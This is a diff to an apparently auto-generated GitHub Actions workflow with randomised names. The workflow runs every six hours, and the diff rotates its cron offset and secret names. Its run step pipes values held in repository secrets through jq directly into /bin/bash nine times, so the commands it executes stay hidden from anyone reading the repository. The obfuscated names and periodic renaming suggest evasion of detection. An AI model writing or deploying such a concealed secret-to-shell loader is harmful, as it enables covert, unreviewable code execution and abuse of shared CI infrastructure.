@@ -3,7 +3,8 @@ name: fanweiti3817
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 5/6 * * *'
+    - cron: '35 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: fanweiti3817
         env:
-          gzlsk1: ${{ secrets.gzlsk1 }}
+          yywd2: ${{ secrets.yywd2 }}
         run: |
-          echo $gzlsk1 | jq -r .kr5 | /bin/bash
-          echo $kn764 | jq -r .hvi390 | /bin/bash
-          echo $mh0 | jq -r .hvvj90684 | /bin/bash
-          echo $llbwu037 | jq -r .thoaa60373 | /bin/bash
-          echo $hfhl0 | jq -r .e38 | /bin/bash
-          echo $x37798 | jq -r .olnep73 | /bin/bash
-          echo $y53192 | jq -r .mwp6439 | /bin/bash
-          echo $gwy3 | jq -r .trxa24463 | /bin/bash
-          echo $pf7847 | jq -r .afbj98 | /bin/bash
+          echo $yywd2 | jq -r .xlaj91177 | /bin/bash
+          echo $lrlb3 | jq -r .a5276 | /bin/bash
+          echo $a6709 | jq -r .youox45 | /bin/bash
+          echo $yiq967 | jq -r .g4660 | /bin/bash
+          echo $kci50368 | jq -r .pdp66768 | /bin/bash
+          echo $u706 | jq -r .a3 | /bin/bash
+          echo $aunu08 | jq -r .v11 | /bin/bash
+          echo $hr43290 | jq -r .mez8 | /bin/bash
+          echo $pz04 | jq -r .r1 | /bin/bash
 
